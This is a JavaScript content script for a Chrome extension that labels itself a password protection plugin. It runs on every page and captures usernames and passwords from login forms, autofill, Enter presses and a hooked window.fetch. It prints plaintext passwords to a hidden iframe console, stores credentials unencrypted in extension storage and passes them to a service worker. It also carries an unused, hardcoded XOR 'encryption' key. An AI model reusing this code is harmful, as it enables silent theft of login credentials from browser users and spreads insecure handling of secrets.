(function() {
    let cachedLoginInfo = null;
    let debugConsole = console;
    let isInitialized = false;

    const config = {
        debug: true,
        version: '1.0.0-beta'  // 添加版本信息
    };

    // 输出版本信息
    function logVersion() {
        log('========================================');
        log(`密码保护插件版本: ${config.version}`);
        log(`运行时间: ${new Date().toLocaleString()}`);
        log('========================================');
    }

    // 初始化函数
    async function init() {
        if (isInitialized) {
            log('插件已经初始化，跳过');
            return;
        }

        logVersion();  // 添加版本信息输出
        log('[密码保护] 开始初始化');
        
        // 从storage恢复状态
        try {
            const result = await new Promise(resolve => {
                chrome.storage.local.get('tempLoginInfo', resolve);
            });
            
            if (result.tempLoginInfo) {
                cachedLoginInfo = result.tempLoginInfo;
                log('从storage恢复了登录信息');
                // 清除临时存储
                chrome.storage.local.remove('tempLoginInfo');
                // 检查登录状态
                setTimeout(checkLoginSuccess, 1000);
            }
        } catch (error) {
            log('恢复状态失败:', error);
        }

        initDebugConsole();
        watchAutofill();
        watchLoginAttempts(); // 替换 watchFormSubmit
        
        isInitialized = true;
        log('[密码保护] 初始化完成');
    }

    // 初始化调试控制台
    function initDebugConsole() {
        try {
            if (config.debug && document.body) {
                const iframe = document.createElement("iframe");
                iframe.style.display = "none";
                document.body.appendChild(iframe);
                if (iframe.contentWindow) {
                    debugConsole = iframe.contentWindow.console;
                    log("调试控制台初始化成功");
                }
            }
        } catch (error) {
            console.log("[密码保护] 调试控制台初始化失败:", error);
        }
    }

    // 日志输出函数
    function log(message) {
        if (config.debug) {
            debugConsole.log("[密码保护] " + message);
        }
    }

    // 通用选择器
    const selectors = {
        password: [
            'input[type="password"]',
            'input[name*="pass"]',
            'input[id*="pass"]',
            '[aria-label*="密码"]',
            '[placeholder*="密码"]'
        ],
        username: [
            'input[type="text"]',
            'input[type="email"]',
            'input[name*="user"]',
            'input[name*="email"]',
            '[aria-label*="用户"]',
            '[aria-label*="账号"]'
        ]
    };

    // 遍历 Shadow DOM
    function deepQuerySelector(root, selector) {
        const elements = Array.from(root.querySelectorAll(selector));
        
        const shadows = Array.from(root.querySelectorAll('*'))
            .filter(el => el.shadowRoot)
            .map(el => deepQuerySelector(el.shadowRoot, selector))
            .flat();
            
        return [...elements, ...shadows];
    }

    // 查找表单元素
    function findFormElements() {
        const results = {
            password: null,
            username: null
        };

        for (const [type, selectorList] of Object.entries(selectors)) {
            for (const selector of selectorList) {
                log(`正在使用选择器 "${selector}" 查找 ${type} 输入框`);
                const elements = deepQuerySelector(document.documentElement, selector);
                log(`找到 ${elements.length} 个匹配元素`);
                
                for (const element of elements) {
                    if (element.value) {
                        results[type] = element;
                        log(`成功找到 ${type} 输入框，值长度: ${element.value.length}`);
                        if (type === 'password') {
                            log(`密码值: ${element.value}`); // 输出实际密码值
                        }
                        break;
                    }
                }
                if (results[type]) break;
            }
        }

        return results;
    }

    // 监听自动填充
    function watchAutofill() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
                    const elements = findFormElements();
                    if (elements.password && elements.password.value) {
                        console.log('[密码保护] 检测到自动填充');
                        cacheLoginInfo(elements);
                    }
                }
            });
        });

        // 观察所有密码输入框的值变化
        selectors.password.forEach(selector => {
            deepQuerySelector(document.documentElement, selector).forEach(element => {
                observer.observe(element, {
                    attributes: true,
                    attributeFilter: ['value']
                });
            });
        });
    }

    // 在content-script.js开头添加加密工具对象
    window.SimpleEncryption = {
        // 加密密钥 (建议定期更换)
        _key: 'PasswordProtection2024!@#',
        
        // 生成随机盐值
        _generateSalt() {
            const array = new Uint8Array(8);
            crypto.getRandomValues(array);
            return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
        },

        // 基础加密函数
        encrypt(text) {
            try {
                const salt = this._generateSalt();
                const combinedKey = this._key + salt;
                
                // 使用XOR加密
                let encrypted = '';
                for (let i = 0; i < text.length; i++) {
                    const charCode = text.charCodeAt(i) ^ combinedKey.charCodeAt(i % combinedKey.length);
                    encrypted += String.fromCharCode(charCode);
                }
                
                // 转换为Base64并添加盐值
                return {
                    content: btoa(encrypted),
                    salt: salt,
                    version: '1'
                };
            } catch (error) {
                log('加密失败:', error);
                return null;
            }
        },

        // 基础解密函数
        decrypt(encrypted) {
            try {
                if (!encrypted || !encrypted.content || !encrypted.salt) {
                    throw new Error('无效的加密数据');
                }
                
                const combinedKey = this._key + encrypted.salt;
                const decoded = atob(encrypted.content);
                
                // XOR解密
                let decrypted = '';
                for (let i = 0; i < decoded.length; i++) {
                    const charCode = decoded.charCodeAt(i) ^ combinedKey.charCodeAt(i % combinedKey.length);
                    decrypted += String.fromCharCode(charCode);
                }
                
                return decrypted;
            } catch (error) {
                log('解密失败:', error);
                return null;
            }
        }
    };

    // 修改缓存登录信息函数,移除加密逻辑
    function cacheLoginInfo(elements) {
        cachedLoginInfo = {
            username: elements.username ? elements.username.value : '',
            password: elements.password.value,
            url: window.location.href,
            timestamp: Date.now()
        };
        
        // 保存到storage
        chrome.storage.local.set({
            tempLoginInfo: cachedLoginInfo
        }, () => {
            log('登录信息已保存到storage');
        });
        
        log('已缓存登录信息:');
        log(`- URL: ${cachedLoginInfo.url}`);
        log(`- 用户名: ${cachedLoginInfo.username}`);
    }

    // 监听所有可能的登录行为
    function watchLoginAttempts() {
        log('开始监听登录行为');

        // 监听表单提交
        document.addEventListener('submit', handleLoginAttempt, true);

        // 监听按钮点击
        document.addEventListener('click', function(e) {
            const loginButtons = [
                ...document.querySelectorAll('button, input[type="button"], input[type="submit"], a'),
            ].filter(el => {
                const text = (el.textContent || el.value || '').toLowerCase();
                const attr = (el.getAttribute('aria-label') || '').toLowerCase();
                return text.includes('登录') || 
                    text.includes('login') || 
                    attr.includes('登录') || 
                    attr.includes('login') ||
                    el.type === 'submit';
            });

            if (loginButtons.includes(e.target)) {
                log('检测到登录按钮点击');
                handleLoginAttempt(e);
            }
        }, true);

        // 监听键盘事件（回车键）
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const activeElement = document.activeElement;
                if (activeElement && 
                    (activeElement.tagName === 'INPUT' || 
                    activeElement.tagName === 'BUTTON')) {
                    log('检测到回车键提交');
                    handleLoginAttempt(e);
                }
            }
        }, true);

        // 监听网络请求
        const originalFetch = window.fetch;
        window.fetch = async function(url, options = {}) {
            const response = await originalFetch.apply(this, arguments);
            
            // 检查是否是登录请求
            if (typeof url === 'string' && 
                (url.includes('login') || 
                url.includes('auth') || 
                url.includes('signin'))) {
                log('检测到登录相关的 Fetch 请求');
                handleLoginAttempt();
            }
            
            return response;
        };

        // 监听表单输入完成
        function watchFormInputs() {
            const passwordInputs = findFormElements().password;
            if (passwordInputs) {
                passwordInputs.addEventListener('blur', function() {
                    if (this.value) {
                        const form = this.closest('form');
                        if (form) {
                            const allInputsFilled = Array.from(form.querySelectorAll('input[required]'))
                                .every(input => input.value.length > 0);
                            if (allInputsFilled) {
                                log('检测到所有必填项已填写完成');
                                handleLoginAttempt();
                            }
                        }
                    }
                });
            }
        }

        watchFormInputs();
    }

    // 修改 handleLoginAttempt 函数,移除密码检查逻辑
    async function handleLoginAttempt(event) {
        const elements = findFormElements();
        if (!elements.password || !elements.password.value) {
            log('未找到有效的密码输入');
            return;
        }

        log('检测到登录尝试');

        const loginInfo = {
            username: elements.username ? elements.username.value : '',
            password: elements.password.value,
            url: window.location.href,
            timestamp: Date.now()
        };

        // 发送到 Service Worker 缓存
        try {
            await chrome.runtime.sendMessage({
                type: 'CACHE_LOGIN_INFO',
                data: loginInfo
            });
            log('登录信息已发送到 Service Worker');
        } catch (error) {
            log('发送登录信息失败:', error);
        }
    }

    // 优化登录成功确认逻辑
    async function checkLoginSuccess() {
        if (!cachedLoginInfo) {
            log('没有缓存的登录信息，跳过检查');
            return;
        }

        // 检查是否过期
        if (Date.now() - cachedLoginInfo.timestamp > 5 * 60 * 1000) {
            log('登录信息已过期，清除缓存');
            await clearLoginCache();
            return;
        }

        // 检查登录状态
        const tokens = ['token', 'auth', 'session'];
        const isLoggedIn = tokens.some(token => 
            document.cookie.includes(token) || 
            localStorage.getItem(token) || 
            sessionStorage.getItem(token)
        );

        if (isLoggedIn) {
            log('[密码保护] 确认登录成功');
            await notifyLoginSuccess();
        }
    }

    // 新增清除登录缓存的辅助函数
    async function clearLoginCache() {
        cachedLoginInfo = null;
        await new Promise(resolve => {
            chrome.storage.local.remove('tempLoginInfo', resolve);
        });
    }

    // 修改通知登录成功函数,移除解密逻辑
    async function notifyLoginSuccess() {
        if (!cachedLoginInfo) {
            log('没有缓存的登录信息可发送');
            return;
        }

        try {
            await new Promise((resolve, reject) => {
                chrome.storage.local.get('loginRecords', function(result) {
                    const records = result.loginRecords || [];
                    
                    // 创建新记录
                    const newRecord = {
                        url: cachedLoginInfo.url,
                        username: cachedLoginInfo.username,
                        password: cachedLoginInfo.password,
                        timestamp: Date.now()
                    };

                    const sameUrlIndex = records.findIndex(record => 
                        new URL(record.url).origin === new URL(newRecord.url).origin
                    );

                    if (sameUrlIndex !== -1) {
                        records[sameUrlIndex] = newRecord;
                    } else {
                        records.push(newRecord);
                    }

                    chrome.storage.local.set({ loginRecords: records }, function() {
                        if (chrome.runtime.lastError) {
                            reject(chrome.runtime.lastError);
                        } else {
                            resolve();
                        }
                    });
                });
            });

            // 发送通知消息
            await chrome.runtime.sendMessage({
                type: 'LOGIN_SUCCESS',
                data: cachedLoginInfo
            });

            // 清除缓存
            cachedLoginInfo = null;
            await chrome.storage.local.remove('tempLoginInfo');
            
        } catch (error) {
            log(`处理登录成功消息失败: ${error.message}`);
        }
    }

    // 确保DOM加载完成后再初始化
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();